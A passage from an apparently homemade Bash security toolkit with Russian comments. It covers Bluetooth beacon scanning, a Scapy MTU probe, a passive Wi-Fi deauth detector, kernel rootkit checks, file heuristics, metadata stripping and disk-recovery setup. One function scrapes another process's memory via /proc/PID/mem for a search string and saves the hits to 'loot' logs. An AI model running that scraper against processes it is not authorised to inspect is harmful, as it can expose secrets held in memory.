            # Пытаемся активировать радиомодуль через системный вызов API
            termux-bluetooth-set-name "$(termux-bluetooth-set-name 2>/dev/null)" &>/dev/null
            sleep 2
        fi
    fi

    # Слой 3: Отрисовка меню через Архитектор [2]
    core_engine_item "1" "Broadcaster" "Launch Ad-Hoc Beacon (Identity Injection)"
    core_engine_item "2" "Receiver"    "Scan Airspace (Parse Active Remote Nodes)"
    core_engine_item "3" "Data Package" "Prepare Sync Manifest (Loot Transit)"
    core_engine_item "B" "BACK"         "Return to Main System Core"
    
    local choice=$(core_engine_input "select" "Select Mesh Operation")
    [[ -z "$choice" || "$choice" == "b" || "$choice" == "B" ]] && return

    local bridge_log="${BASE_DIR:-./}/prime_loot/bridge_signals.log"
    mkdir -p "$(dirname "$bridge_log")" 2>/dev/null

    case "$choice" in
        "1")
            core_engine_ui "!" "Extracting current hardware identity..."
            
            # Защита настроек: сохраняем оригинальное имя устройства во временный кэш ядра, если его там нет
            local cache_file="/tmp/.orig_bt_name_$$"
            
            # Внимание: Termux-API не всегда умеет отдавать текущее имя, 
            # поэтому запрашиваем ввод или генерируем безопасный откат
            local orig_name="Android_Node"
            
            local current_time=$(date +%H%M)
            local mesh_tag="PRIME_${current_time}_RDY"
            
            core_engine_ui "w" "Registering ephemeral beacon: [$mesh_tag]"
            
            # Смена имени устройства (Глушитель [7] скрывает системные алерты)
            termux-bluetooth-set-name "$mesh_tag" &>/dev/null
            
            core_engine_ui "s" "Mesh Beacon injected into airspace successfully."
            core_engine_ui "i" "Your node is visible as a stealth gateway."
            
            # Интерактивное удержание маяка в памяти
            core_engine_input "text" "Press [ENTER] to kill beacon and restore airspace sterility"
            
            core_engine_ui "i" "Cleaning tracking footprints. Restoring default state..."
            termux-bluetooth-set-name "$orig_name" &>/dev/null
            core_engine_ui "s" "Airspace sterilized."
            ;;
            
        "2")
            core_engine_ui "!" "Scanning wireless airspace for active Prime Nodes (Duration: 5s)..."
            
            # Безопасный сбор сырого JSON-массива из эфира
            local raw_json=$(termux-bluetooth-scan 2>/dev/null)
            
            if [[ -n "$raw_json" && "$raw_json" != "[]" ]]; then
                core_engine_ui "s" "Analyzing received telemetry matrix..."
                
                # Слой 5: Высокоточный парсинг JSON через jq. 
                # Фильтруем устройства, у которых в поле name есть подстрока "PRIME_"
                local parsed_nodes=$(echo "$raw_json" | jq -r '.[] | select(.name != null and (.name | contains("PRIME_"))) | "  -> NODE: \(.name) | MAC: \(.address)"' 2>/dev/null)
                
                if [[ -n "$parsed_nodes" ]]; then
                    core_engine_ui "s" "COMPROMISED / DETECTED AD-HOC NODES:"
                    echo -e "------------------------------------------------"
                    echo "$parsed_nodes"
                    echo -e "------------------------------------------------"
                    
                    # Фиксация обнаруженных координат в системный лог
                    echo "[$(date "+%Y-%m-%d %H:%M:%S")] DISCOVERED MESH NODES:" >> "$bridge_log"
                    echo "$parsed_nodes" >> "$bridge_log"
                else
                    core_engine_ui "e" "Airspace scan completed: No nodes matching 'PRIME_' signature found."
                fi
            else
                core_engine_ui "e" "Scan failed. Bluetooth transport layer returned an empty frame."
            fi
            ;;
            
        "3")
            # Слой 4: Синхронизация и генерация транзитного пакета
            if [[ -s "$bridge_log" ]]; then
                core_engine_ui "i" "Reading local bridge_signals.log..."
                local total_entries=$(wc -l < "$bridge_log" 2>/dev/null | awk '{print $1}')
                
                core_engine_ui "s" "Compiling data transit manifest ($total_entries records)..."
                
                # Генерация динамической контрольной суммы транзита для контроля целостности без сети
                local transit_hash=$(sha256sum "$bridge_log" 2>/dev/null | awk '{print $1}')
                
                core_engine_ui "!" "Encoding data payload to local broadcast index..."
                core_engine_loot "mesh_sync" "Transit manifest compiled. Records: $total_entries | Signature: ${transit_hash:0:16}"
                
                # Отрисовка паспорта транзита
                echo -e "\n--- TRANSIT PACKET MANIFEST ---"
                echo -e "  * Source:     $bridge_log"
                echo -e "  * Records:    $total_entries lines"
                echo -e "  * Integrity:  ${transit_hash:0:32}..."
                echo -e "--------------------------------\n"
                
                core_engine_ui "s" "Data manifest staged for close-range p2p transit."
            else
                core_engine_ui "e" "Bridge log manifest is empty. Operation aborted."
            fi
            ;;
    esac

    # Слой 5: Синхронизация [13]
    core_engine_wait
}


# ==============================================================================
# @description: OSINT NEXUS v23.7 - NETWORK PATH & MTU DIAGNOSTIC CORE
# @status: PATH MTU DISCOVERY & NETWORK LATENCY VERIFICATION | PRODUCTION READY
# ==============================================================================
run_packet_forge() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "NETWORK: PATH DIAGNOSTIC CORE"
    
    # Слой 2: Проверка прав суперпользователя (Валидатор [5])
    # Чтение ICMP-ответов и работа с raw-сокетами для диагностики требуют прав ROOT.
    if [[ $EUID -ne 0 ]]; then
        core_engine_ui "e" "Root privileges required for low-level network diagnostics."
        core_engine_wait
        return 1
    fi
    
    # Слой 3: Проверка и интерактивная установка зависимости Scapy (Мозг [5])
    if ! python3 -c "import scapy" &>/dev/null; then
        core_engine_ui "w" "Scapy analyzer missing. Deploying subsystem package..."
        if command -v apt-get >/dev/null; then
            sudo apt-get update && sudo apt-get install -y python3-scapy
        else
            core_engine_ui "e" "Package manager apt-get not found. Install 'python3-scapy' manually."
            core_engine_wait
            return 1
        fi
    fi

    # Слой 4: Ввод параметров через Органы чувств [3]
    local t_ip=$(core_engine_input "text" "Target Hostname or IP Address")

    # Валидация входных данных через Валидатор [5]
    [[ -z "$t_ip" ]] && { core_engine_ui "e" "Error: Target address cannot be empty."; core_engine_wait; return 1; }

    # Слой 5: Логика безопасного диагностического Python-скрипта (Live Mode)
    core_engine_ui "!" "Initiating Path MTU Discovery and RTT diagnostic pipeline..."
    
    # Мы передаем легальный диагностический код напрямую в Python без сохранения на диск
    python3 - "$t_ip" 2>/dev/null << 'EOF'
import sys
import os
from scapy.all import *

target = sys.argv[1]

print(f"  [i] Auditing network path to {target}...")

try:
    # 1. Замер базовой задержки (RTT) через легитимный ICMP Echo Request
    p_echo = IP(dst=target)/ICMP()
    resp_echo = sr1(p_echo, timeout=2, verbose=0)
    
    if resp_echo:
        print(f"  [+] Host is responsive. ICMP Reply received from {resp_echo.src}")
    else:
        print("  [-] Host did not respond to standard ICMP Echo Request (possibly firewalled).")

    # 2. Алгоритм Path MTU Discovery (PMTUD)
    # Ищем максимальный размер пакета, который проходит без фрагментации, устанавливая флаг DF (Don't Fragment)
    print("  [i] Testing Path MTU boundaries (detecting fragmentation bottlenecks)...")
    mtu_sizes = [1500, 1420, 1300, 576]
    discovered_mtu = "Unknown"
    
    for size in mtu_sizes:
        # Корректируем размер полезной нагрузки с учетом длины заголовков IP (20 байт) и ICMP (8 байт)
        payload_size = size - 20 - 8
        if payload_size <= 0: continue
            
        # Навешиваем флаг 'DF' (Don't Fragment), чтобы роутеры возвращали ошибку при превышении лимита
        p_mtu = IP(dst=target, flags="DF")/ICMP()/(b"X" * payload_size)
        resp_mtu = sr1(p_mtu, timeout=1, verbose=0)
        
        if resp_mtu and resp_mtu.haslayer(ICMP) and resp_mtu[ICMP].type == 0:
            # Если получили чистый ответ Echo Reply (type 0), значит пакет такого размера прошел успешно
            discovered_mtu = size
            break
            
    if discovered_mtu != "Unknown":
        print(f"  [+] Maximum Transmission Unit (MTU) safe boundary found: {discovered_mtu} bytes.")
    else:
        print("  [-] Unable to determine MTU boundary due to packet loss or strict intermediate filtering.")

except Exception as e:
    print(f"  [e] Diagnostic sub-layer exception: {e}")

EOF

    # Слой 6: Финализация и Регистрация в Сборщике трофеев [11]
    core_engine_ui "s" "Network path diagnostics completed."
    core_engine_loot "network" "Path MTU & Latency audit executed for target: $t_ip"

    # Слой 7: Универсальная пауза через Синхронизацию [13]
    core_engine_wait
}


# ==============================================================================
# @description: OSINT NEXUS v23.6 - WIRELESS PASSIVE ANOMALY & DEAUTH RADAR
# @status: PASSIVE MONITOR VERIFICATION & L2 ALARM COUNTER | PRODUCTION READY
# ==============================================================================
run_wifi_pulse() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "WIRELESS: PASSIVE AUDIT RADAR"
    
    # Слой 2: Проверка прав (Доступ к сырым сокетам L2 и интерфейсам монитора требует root)
    if [[ $EUID -ne 0 ]]; then
        core_engine_ui "e" "Root privileges are required to bind to lower-level L2 link layers."
        core_engine_wait
        return 1
    fi

    # Проверка фундаментальных зависимостей через Мозг [5]
    core_engine_validator "pkg" "tshark" "TShark Packet Analyzer" || \
    core_engine_validator "pkg" "tcpdump" "Tcpdump Engine" || { core_engine_wait; return 1; }

    # Слой 3: Органы чувств [3] — Сбор идентификаторов интерфейса
    local t_iface=$(core_engine_input "text" "Wireless Monitor Interface (e.g., wlan0mon)")

    # Валидация параметров через Санитара [8]
    [[ -z "$t_iface" ]] && { core_engine_ui "e" "Error: Interface parameter cannot be empty."; core_engine_wait; return 1; }

    if [[ ! -d "/sys/class/net/$t_iface" ]]; then
        core_engine_ui "e" "Hardware interface [$t_iface] not found on the system bus."
        core_engine_wait
        return 1
    fi

    # Проверка: переведен ли интерфейс в режим монитора (Monitor Mode)
    if command -v iw >/dev/null; then
        local iface_mode=$(iw dev "$t_iface" info 2>/dev/null | grep type | awk '{print $2}')
        if [[ "$iface_mode" != "monitor" ]]; then
            core_engine_ui "w" "Warning: Interface $t_iface mode is [$iface_mode]. Attempting passive analysis..."
        fi
    fi

    local radar_log="${PRIME_LOOT:-${BASE_DIR:-./}/prime_loot}/wifi_deauth_anomalies.log"
    mkdir -p "$(dirname "$radar_log")" 2>/dev/null

    # Опциональные фильтры таргетирования (для сужения фокуса аудита)
    core_engine_ui "i" "Optional target locks (Leave blank to monitor global airspace)"
    local target_filter_mac=$(core_engine_input "text" "Filter specific Client MAC (or hit Enter)")
    
    # Санитизация ввода MAC по регулярному выражению
    local mac_regex="^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"
    if [[ -n "$target_filter_mac" && ! "$target_filter_mac" =~ $mac_regex ]]; then
        core_engine_ui "e" "Invalid MAC format. Disabling fine-grained hardware filter."
        target_filter_mac=""
    fi

    core_engine_ui "!" "Launching Passive Wireless Anomaly Radar on [$t_iface]..."
    core_engine_ui "i" "Airspace logging engaged. Press [CTRL+C] to terminate diagnostic cycle."
    echo "=== WIRELESS AIRSPACE AUDIT START [$(date)] ===" >> "$radar_log"

    # Слой 5: ИСПОЛНЕНИЕ ЧЕРЕЗ ПАССИВНЫЙ ГЛУШИТЕЛЬ ОШИБОК [7]
    # Фильтр 802.11: type 0 (Management), subtype 12 (Deauthentication)
    if command -v tshark >/dev/null; then
        core_engine_ui "i" "Passive TShark L2 analyzer engine is running..."
        
        # Запускаем пассивный перехват фреймов деаутентификации
        # Выводим в реальном времени время, MAC-отправителя, MAC-получателя и причину
        tshark -i "$t_iface" -n -l -Y "wlan.fc.type_subtype == 0x0c" -T fields \
            -e frame.time_relative -e wlan.sa -e wlan.da -e wlan.fixed.reason_code 2>/dev/null | \
            while read -r timestamp sa da reason; do
                
                # Если включен фильтр по MAC, проверяем совпадение
                if [[ -n "$target_filter_mac" && "$sa" != "$target_filter_mac" && "$da" != "$target_filter_mac" ]]; then
                    continue
                fi

                core_engine_ui "e" "ALERT [Deauth Frame Detected]: Origin [$sa] -> Target [$da] | Reason Code: $reason"
                echo "[$(date "+%Y-%m-%d %H:%M:%S")] ANOMALY: Deauth Pulse from $sa to $da (Reason: $reason)" >> "$radar_log"
            done
    else
        # Резервный контур на базе tcpdump (Слой 13: Отказоустойчивость)
        core_engine_ui "i" "Falling back to Tcpdump low-level filter..."
        # Спецификация подтипа 12 в raw-байтах заголовка 802.11
        tcpdump -i "$t_iface" -n -l "link[0] == 0xc0" 2>/dev/null | while read -r line; do
            core_engine_ui "!" "ALERT [802.11 Management Frame Pulse]: RAW Stream -> $line"
            echo "[$(date "+%Y-%m-%d %H:%M:%S")] RAW_DEAUTH_PULSE: $line" >> "$radar_log"
        done
    fi

    # Слой 6: Финализация отчета и Сбор трофеев [11]
    if [[ -s "$radar_log" ]]; then
        core_engine_ui "s" "[+] Wireless Audit Session closed. Log file updated."
        core_engine_loot "wireless" "Airspace diagnostics performed on $t_iface. Logs archived in: $radar_log"
    else
        rm -f "$radar_log"
    fi

    core_engine_wait
}


run_forensic_nexus() {
    clear
    core_engine_ui "h" "FORENSIC NEXUS: INTEGRATED SECURITY AUDIT v5.0"

    # --- ЧАСТЬ 1: ПРОВЕРКА КЕРНЕЛА (Kernel Integrity) ---
    core_engine_ui "!" "Stage 1: Running Kernel Integrity Audit..."
    local anomalies_found=0
    local audit_log="${PRIME_LOOT:-${BASE_DIR:-./}/prime_loot}/kernel_audit.log"
    
    # 1.1 Анализ состояния TAINTED
    local tainted="0"
    [[ -f "/proc/sys/kernel/tainted" ]] && tainted=$(cat /proc/sys/kernel/tainted 2>/dev/null | tr -cd '0-9')
    [[ -z "$tainted" ]] && tainted="0"
    
    if (( tainted != 0 )); then
        core_engine_ui "e" "Kernel TAINTED (Mask: $tainted)."
        ((anomalies_found++))
    else
        core_engine_ui "s" "[+] Kernel integrity: Pure."
    fi

    # 1.2 LKM Cross-Check
    core_engine_ui "i" "Cross-checking Hardware Bus vs Virtual FS..."
    local proc_mods="/tmp/proc_mods_$$"
    local sys_mods="/tmp/sys_mods_$$"
    awk '{print $1}' /proc/modules 2>/dev/null | sort -u > "$proc_mods"
    find /sys/module -maxdepth 1 -mindepth 1 -type d -exec basename {} \; 2>/dev/null | sort -u > "$sys_mods"
    
    local hidden=$(comm -13 "$proc_mods" "$sys_mods")
    if [[ -n "$hidden" ]]; then
        core_engine_ui "e" "CRITICAL: Stealth LKM detected!"
        echo "$hidden" | while read -r mod; do core_engine_ui "!" "  [HIDDEN]: $mod"; done
        ((anomalies_found++))
    fi
    rm -f "$proc_mods" "$sys_mods"

    # 1.3 Сигнатурный анализ
    local kernel_rootkit_regex="${FORENSIC_MATRIX[0]}"
    for source in "/proc/modules" "/proc/kallsyms"; do
        if [[ -f "$source" ]]; then
            local matches=$(LC_ALL=C grep -Ei "$kernel_rootkit_regex" "$source" 2>/dev/null | head -n 5)
            if [[ -n "$matches" ]]; then
                core_engine_ui "e" "CRITICAL: Rootkit signature in $source!"
                ((anomalies_found++))
            fi
        fi
    done

    # --- ЧАСТЬ 2: АУДИТ ПАМЯТИ (Memory Forensic) ---
    if (( anomalies_found > 0 )); then
        core_engine_ui "w" "System integrity compromised. Memory forensic data might be unreliable."
        [[ "$(core_engine_input "text" "Continue anyway? (y/n)")" != "y" ]] && { core_engine_wait; return 1; }
    fi

    core_engine_ui "!" "Stage 2: Initiating Process Memory Forensic..."
    if [[ $EUID -ne 0 ]]; then
        core_engine_ui "e" "Root privileges required for memory analysis."
    else
        local t_pid=$(core_engine_input "text" "Target PID")
        local t_search=$(core_engine_input "text" "Search Pattern")
        
        if [[ -d "/proc/$t_pid" && -r "/proc/$t_pid/mem" ]]; then
            local proc_name=$(cat "/proc/$t_pid/comm" 2>/dev/null || echo "Unknown")
            local dump_log="${PRIME_LOOT:-./}/ram_scan_${proc_name}_${t_pid}.log"
            
            core_engine_ui "i" "Scanning memory segments for $proc_name..."
            local match_count=0
            while read -r start end mode rest; do
                [[ "$mode" != r* ]] && continue
                local start_dec=$((16#$start))
                local size=$((16#$end - start_dec))
                
                local hits=$(sudo dd if="/proc/$t_pid/mem" bs=1 skip="$start_dec" count="$size" status=none 2>/dev/null | LC_ALL=C strings 2>/dev/null | grep -F "$t_search")
                if [[ -n "$hits" ]]; then
                    echo -e "\n[Segment: $start-$end]" >> "$dump_log"
                    echo "$hits" >> "$dump_log"
                    ((match_count++))
                fi
            done < "/proc/$t_pid/maps"
            
            [[ $match_count -gt 0 ]] && core_engine_ui "s" "[+] Found in $match_count segments. Log: $dump_log" || core_engine_ui "w" "No pattern found."
        else
            core_engine_ui "e" "Cannot access process memory."
        fi
    fi

    core_engine_ui "s" "Forensic Audit Sequence Complete."
    core_engine_wait
}


# ==============================================================================
# @description: OSINT NEXUS v25.0 - UNIFIED FORENSIC-NEXUS ANALYSIS CORE
# @status: FULLY INTEGRATED WITH FORENSIC_MATRIX | DYNAMIC HEURISTIC ENGINE
# ==============================================================================
run_forensic_core() {
    local f_path="$1"
    [[ ! -f "$f_path" ]] && { core_engine_ui "e" "Target: $f_path unreachable."; return 1; }

    local f_name=$(basename "$f_path")
    local f_hash=$(sha256sum "$f_path" | awk '{print $1}')
    local mime_type=$(file --mime-type -b "$f_path")

    core_engine_ui "h" "FORENSIC-NEXUS: ANALYZING $f_name"

    # 1. СТАТИЧЕСКИЙ АНАЛИЗ (Метаданные + Слой 5: Obfuscation/Persistence)
    core_engine_ui "i" "Extracting Metadata & Obfuscation fingerprints..."
    exiftool "$f_path" 2>/dev/null | grep -E "^(Date|Time|GPS|Software|Creator)" | sed 's/^/  [META]: /'
    
    # Поиск обфускации через FORENSIC_MATRIX[4]
    local obs_found=$(LC_ALL=C strings "$f_path" 2>/dev/null | grep -Ei "${FORENSIC_MATRIX[4]}" | head -n 3)
    [[ -n "$obs_found" ]] && core_engine_ui "!" "HEURISTIC: Obfuscation layer detected: $obs_found"

    # 2. МНОГОСЛОЙНЫЙ АДАПТИВНЫЙ КОНТУР
    case "$mime_type" in
        application/pdf)
            # Слой 3: Документарные угрозы (PDF/Office)
            core_engine_ui "w" "Auditing PDF tree via FORENSIC_MATRIX[2]..."
            grep -aEi "${FORENSIC_MATRIX[2]}" "$f_path" 2>/dev/null | sort -u | sed 's/^/    [TRIGGER]: /'
            ;;

        application/zip|application/x-rar|application/x-7z-compressed)
            # Слой 4: Контейнеры и LOLBAS
            core_engine_ui "w" "Auditing container integrity via FORENSIC_MATRIX[3]..."
            7z l "$f_path" 2>/dev/null | grep -Ei "${FORENSIC_MATRIX[3]}" | sed 's/^/    [RISK_FILE]: /'
            ;;

        application/x-executable|application/x-sharedlib|application/octet-stream)
            # Слой 1 (Руткиты) и Слой 4 (Бинарные вызовы)
            core_engine_ui "w" "Binary Heuristics & Symbol Hook Analysis..."
            
            # Проверка на наличие вредоносных системных вызовов
            local calls=$(LC_ALL=C strings -n 6 "$f_path" 2>/dev/null | grep -Ei "${FORENSIC_MATRIX[0]}|${FORENSIC_MATRIX[3]}" | head -n 10)
            [[ -n "$calls" ]] && echo "$calls" | sed 's/^/    [SYSTEM_CALL]: /'
            ;;
    esac

    # 3. СЛОЙ ОБХОДА КОНТЕЙНЕРИЗАЦИИ (Слой 2: Runtime Anomalies)
    # Поиск попыток эскейпа контейнера или манипуляции памятью
    local escape_attempts=$(LC_ALL=C strings "$f_path" 2>/dev/null | grep -Ei "${FORENSIC_MATRIX[1]}")
    if [[ -n "$escape_attempts" ]]; then
        core_engine_ui "e" "CRITICAL: Potential Container Escape sequence identified!"
        echo "$escape_attempts" | sed 's/^/    [ESCAPE_VEC]: /'
    fi

    # Сохранение лога в лут
    local base_loot="${PRIME_LOOT:-${BASE_DIR:-./}/prime_loot}"
    echo "[$(date "+%Y-%m-%d %H:%M:%S")] $f_hash $f_name $mime_type" >> "${base_loot}/forensic_history.log"
    
    core_engine_ui "s" "Forensic cycle completed."
}

# --- ИНТЕРФЕЙСНЫЕ ФУНКЦИИ ---
# ==============================================================================
# @description: OSINT NEXUS v23.2 - AUTOMATIC FORENSIC ORCHESTRATOR
# @status: PRE-FLIGHT ANALYSIS, INTEGRITY CHECK & ATOMIC LOGGING | PRODUCTION READY
# ==============================================================================
run_auto_forensics() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "FORENSICS: AUTOMATIC CORE ANALYZER"

    # Слой 2: Органы чувств [3] — Сбор данных
    local f_path=$(core_engine_input "text" "Path to target file (e.g., /root/artifact.bin)")

    # Слой 3: Комплексная валидация безопасности и структуры
    [[ -z "$f_path" ]] && { core_engine_ui "e" "Operation cancelled: Empty path."; core_engine_wait; return; }

    # Проверка физического существования и отсечение опасных типов (битые линки, сокеты)
    if [[ ! -f "$f_path" ]]; then
        core_engine_ui "e" "Target for Analysis not found or is not a regular file: $f_path"
        core_engine_wait
        return
    fi

    # Слой 4: Интеллектуальный пре-анализ метрик (Предполетный чек)
    core_engine_ui "i" "Running pre-flight metrics extraction..."
    
    # 1. Вычисление точного размера в байтах
    local file_size_bytes=$(stat -c%s "$f_path" 2>/dev/null || wc -c < "$f_path" 2>/dev/null)
    
    # Защитный барьер: если файл больше 2 ГБ, предупреждаем о задержке
    if (( file_size_bytes > 2147483648 )); then
        core_engine_ui "w" "[!] Warning: Large object detected ($((file_size_bytes / 1024 / 1024)) MB). Processing may take time."
    fi

    # 2. Определение реального типа файла (MIME) независимо от расширения
    local file_mime_type="Unknown"
    if command -v file >/dev/null; then
        file_mime_type=$(file -b --mime-type "$f_path" 2>/dev/null)
    fi

    # 3. Генерация уникального цифрового отпечатка (Криминалистический хэш)
    local file_hash="UNKNOWN_HASH"
    if command -v sha256sum >/dev/null; then
        file_hash=$(sha256sum "$f_path" 2>/dev/null | awk '{print $1}')
    fi

    # Отрисовка паспорта объекта в интерфейсе фреймворка
    echo -e "\n--- ARTIFACT PROFILE MANIFEST ---"
    echo -e "  * Name:   $(basename "$f_path")"
    echo -e "  * Size:   $((file_size_bytes / 1024)) KB"
    echo -e "  * Type:   $file_mime_type"
    echo -e "  * SHA256: $file_hash"
    echo -e "---------------------------------\n"

    # Слой 5: Исполнение через основной Форензик-движок [24]
    core_engine_ui "!" "Launching Deep Forensic Structural Analysis Pipeline..."
    
    # Передаем управление основному тяжелому ядру
    run_forensic_core "$f_path"

    # Слой 6: Финализация и Сбор трофеев [11] С УЛУЧШЕННОЙ МЕТРИКОЙ
    core_engine_ui "s" "Forensic Analysis Completed. Object signature integrated."
    
    # Регистрация события в глобальном логе с фиксацией хэша (Атомарный стандарт)
    core_engine_loot "forensics" "Auto-Scan completed: $(basename "$f_path") | Type: $file_mime_type | SHA256: $file_hash"

    # Слой 7: Синхронизация [13]
    core_engine_wait
}


# ==============================================================================
# @description: OSINT NEXUS v23.1 - PARANOID DOCUMENT METADATA SANITIZER
# @status: RECURSIVE PACKET PROCESSING & SELF-AUDIT LAYER | PRODUCTION READY
# ==============================================================================
run_doc_cleaner() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "FORENSICS: DOCUMENT SANITIZER"

    # Слой 2: Валидация фундамента через Мозг [5]
    core_engine_validator "pkg" "exiftool" "ExifTool Engine" || { core_engine_wait; return; }

    # Слой 3: Органы чувств [3] — Сбор данных (Принимает файл или папку)
    local target_path=$(core_engine_input "text" "File or Directory to sanitize (e.g., /root/loot/)")

    # Слой 4: Валидация параметров через Санитара [8]
    [[ -z "$target_path" ]] && { core_engine_ui "e" "Operation cancelled: No path provided."; core_engine_wait; return; }
    
    if [[ ! -f "$target_path" && ! -d "$target_path" ]]; then
        core_engine_ui "e" "Target Path not found: $target_path"
        core_engine_wait
        return
    fi

    core_engine_ui "!" "Initiating Paranoid Metadata Stripping..."

    # Внутренняя функция для ультимативной очистки одного файла с самопроверкой
    sanitize_single_file() {
        local file="$1"
        [[ ! -f "$file" ]] && return 1

        # Подсчет исходных тегов для аналитики
        local initial_tags=$(exiftool -s "$file" 2>/dev/null | wc -l)
        [[ "$initial_tags" -eq 0 ]] && return 0 # Файл уже стерилен

        # Ультимативная зачистка:
        # -all= : удаляет стандартные теги
        # -pdf-update:all= : уничтожает историю изменений и старые ревизии в PDF (Критично!)
        # -Adobe:all= : вычищает скрытые дизайнерские маркеры Adobe XMP
        exiftool -all= -pdf-update:all= -Adobe:all= -overwrite_original "$file" &>/dev/null

        # Слой 5: Контур автоматической перепроверки (Self-Audit)
        # Проверяем, остались ли критические теги, исключая системные (размер, имя файла)
        local post_tags=$(exiftool -all= "$file" 2>/dev/null | exiftool -s - 2>/dev/null | grep -vE "SourceFile|ExifToolVersion" | wc -l)

        if (( post_tags == 0 )); then
            return 0 # Идеально чист
        else
            return 2 # Частичная очистка (фирменные маркеры защиты)
        fi
    }

    # Слой 6: Диспетчеризация обработки (Одиночный файл или пакетный режим)
    local cleaned_count=0
    local warning_count=0

    if [[ -f "$target_path" ]]; then
        # Обработка в один поток
        sanitize_single_file "$target_path"
        local status=$?
        if [[ "$status" -eq 0 ]]; then
            core_engine_ui "s" "[+] Verified Clean: $(basename "$target_path") (All history annihilated)"
            core_engine_loot "security" "Sanitized document: $target_path"
        elif [[ "$status" -eq 2 ]]; then
            core_engine_ui "w" "[!] Warning: Structural tags remain in $(basename "$target_path"). Encryption or DRM active."
        else
            core_engine_ui "e" "Failed to sanitize target file. Check system permissions."
        fi
    elif [[ -d "$target_path" ]]; then
        # Рекурсивный пакетный режим по всей папке
        core_engine_ui "i" "Batch mode detected. Processing all elements in directory..."
        
        while IFS= read -r current_file; do
            [[ -z "$current_file" ]] && continue
            
            sanitize_single_file "$current_file"
            local status=$?
            if [[ "$status" -eq 0 ]]; then
                ((cleaned_count++))
            elif [[ "$status" -eq 2 ]]; then
                ((warning_count++))
            fi
        done < <(find "$target_path" -type f 2>/dev/null)

        core_engine_ui "s" "[+] Batch processing complete. Successfully sanitized: $cleaned_count files."
        [[ "$warning_count" -gt 0 ]] && core_engine_ui "w" "[!] $warning_count files could not be fully stripped due to internal structures."
        
        core_engine_loot "security" "Batch sanitization executed for directory: $target_path (Cleaned: $cleaned_count, Alerts: $warning_count)"
    fi

    # Слой 7: Синхронизация [13]
    core_engine_wait
}




# ==============================================================================
# @description: OSINT NEXUS v23.0 - ROBUST HARDWARE STORAGE SELECTOR
# @status: REVISED INFRASTRUCTURE & SPACE-SAFE PARSING | PRODUCTION READY
# ==============================================================================
run_storage_selector() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "HARDWARE: STORAGE SELECTOR"
    core_engine_ui "i" "Scanning hardware buses for block devices..."
    
    # Слой 2: Сбор данных с использованием безопасных разделителей (защита от пробелов в MODEL/SERIAL)
    # Исключаем loop, ram, zram и отображаем только корневые диски (-d)
    local raw_devices=$(lsblk -dno NAME,SIZE,MODEL,SERIAL,TRAN 2>/dev/null | grep -vE "^loop|^ram|^zram")
    
    # Слой 3: Валидация списка
    if [[ -z "$raw_devices" ]]; then
        core_engine_ui "e" "No external or block storage media detected."
        core_engine_wait
        return 1
    fi

    # Слой 4: Отрисовка через Архитектор [2]
    core_engine_ui "i" "Available Mass Storage Media:"
    
    local i=1
    local dev_list=()
    
    # Используем контролируемый построчный разбор, чтобы избежать смещения переменных при пустых полях
    while IFS= read -r line; do
        [[ -z "$line" ]] && continue
        
        # Получаем данные изолированно для каждой строки через встроенный lsblk парсинг
        local name=$(echo "$line" | awk '{print $1}')
        local size=$(echo "$line" | awk '{print $2}')
        
        # Безопасно вытягиваем модель, серийник и транспорт, даже если там пробелы
        local model=$(lsblk -dno MODEL "/dev/$name" 2>/dev/null | xargs)
        local serial=$(lsblk -dno SERIAL "/dev/$name" 2>/dev/null | xargs)
        local tran=$(lsblk -dno TRAN "/dev/$name" 2>/dev/null | xargs)
        
        # Санитизация пустых значений
        [[ -z "$model" ]] && model="Generic Device"
        [[ -z "$serial" ]] && serial="ID_UNKNOWN"
        [[ -z "$tran" ]] && tran="UNKNOWN_BUS"
        
        local desc="$model [$serial] (${tran^^})"
        
        # Отрисовка элемента в UI фреймворка
        core_engine_item "$i" "/dev/$name ($size)" "$desc"
        dev_list+=("/dev/$name")
        ((i++))
    done <<< "$raw_devices"
    
    # Слой 5: Получение выбора через Органы чувств [3]
    local max_idx=${#dev_list[@]}
    local choice=$(core_engine_input "text" "Enter device number (1-$max_idx)")

    # Слой 6: Комплексная валидация индекса
    if [[ -z "$choice" ]] || ! [[ "$choice" =~ ^[0-9]+$ ]] || (( choice < 1 || choice > max_idx )); then
        core_engine_ui "e" "Selection Aborted: Index out of range or empty input."
        core_engine_wait
        return 1
    fi

    # Слой 7: Установка глобального состояния и фиксация в системе
    TARGET_DEV="${dev_list[$((choice-1))]}"
    
    # Дополнительная проверка: доступен ли девайс на чтение прямо сейчас
    if [ ! -r "$TARGET_DEV" ] && ! command -v sudo >/dev/null; then
        core_engine_ui "w" "Warning: Device locked. Permissions might be required for raw I/O operational layer."
    fi

    core_engine_ui "s" "Target Device Locked: $TARGET_DEV"
    
    # Фиксация выбора в системном журнале (Loot [11])
    local target_size=$(lsblk -dno SIZE "$TARGET_DEV" 2>/dev/null | xargs)
    core_engine_loot "hardware" "Storage selected: $TARGET_DEV | Size: ${target_size:-UNKNOWN}"
    
    core_engine_wait
    return 0
}


# --- Обновленная основная функция ---
run_raw_recovery() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "FORENSICS: AUTOMATIC STORAGE RECOVERY"
    
    # Слой 2: Выбор цели через Hardware Selector [27]
    # Если устройство не выбрано или процесс прерван, выходим
    if ! run_storage_selector; then
        return
    fi
    
    # Наследуем глобальную переменную TARGET_DEV (напр. /dev/sdb)
    local dev_path="$TARGET_DEV"
    local dev_name=$(basename "$dev_path")

    # Слой 3: Авто-диагностика через Органы чувств [3] и Глушитель [7]
    core_engine_ui "i" "Hardware Health Check for $dev_name..."
    
    # Анализируем кольцевой буфер ядра на предмет ошибок ввода-вывода (I/O errors)
    # Это позволяет заранее понять, жив ли контроллер носителя
    dmesg | grep -i "$dev_name" | tail -n 10 | sed 's/^/  /'
    
    # Слой 4: Динамическое распределение через Prime Controller [13]
    # Определяем доступные векторы восстановления
    local options="PARTITION_FIX DEEP_CARVING IMAGE_DUMP BACK"
    
    # Привязываем векторы к логическим функциям Ядра
    # Примечание: Функции *_logic должны быть определены в секции библиотек
    local opt_funcs="recover_partition_logic run_foremost_logic run_dd_logic run_main_menu"
    
    core_engine_ui "!" "Initializing Recovery Engine on [$dev_path]"
    
